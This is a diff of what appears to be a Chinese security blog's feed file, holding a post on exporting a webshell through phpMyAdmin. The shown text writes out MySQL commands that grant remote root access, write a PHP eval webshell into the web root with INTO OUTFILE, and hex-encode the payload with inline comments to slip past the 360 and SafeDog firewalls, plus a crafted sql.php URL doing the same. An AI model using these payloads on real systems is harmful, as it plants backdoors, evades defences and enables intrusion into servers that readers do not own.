@@ -31,7 +31,7 @@ set global general_log='off';              //关闭general_log模式</code></pre
 <pre><code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;     //开启MySQL外链
 flush privileges;                      //刷新MySQL系统权限相关表绕过360 （通过内联注释）
 select '<?php @eval($_POST[pass]);?>' into /*!50001outfile*/ 'c:/phpstudy/www/bypass.php';
-绕过网站安全狗<4.0 （通过hex编码） select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'c:\\phpstudy\\www\\bypass.php'; 绕过安全狗4.0 通过hex编码+内联注释 *!50001select* 'c:\\phpstudy\\www\\bypass.php';< pre></4.0></code>
+绕过网站安全狗<4.0 （通过hex编码） select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'c:\\phpstudy\\www\\bypass.php'; 绕过安全狗4.0 通过hex编码+内联注释 *!50001select* < pre></4.0></code>
 <p>绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell</p>
 <pre><code>以上的三个文件的作用是（执行SQL语句）
 但是如果被删除了可以通过以下的方法
@@ -39,41 +39,13 @@ select '<?php @eval($_POST[pass]);?>' into /*!50001outfile*/ 'c:/phpstudy/www/by
 (2)自己选择一个数据库和数据表
 (3)参数pos=0
 &sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
-例如 http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&token=token值&table=数据表名&pos=0&sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';</code></pre>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</pre>]]></content>
+例如 http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&token=token值&table=数据表名&pos=0&sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';</code></pre></pre>]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>phpmyadmin</tag>
+      </tags>
   </entry>
   <entry>
     <title>渗透测试面试问题二</title>
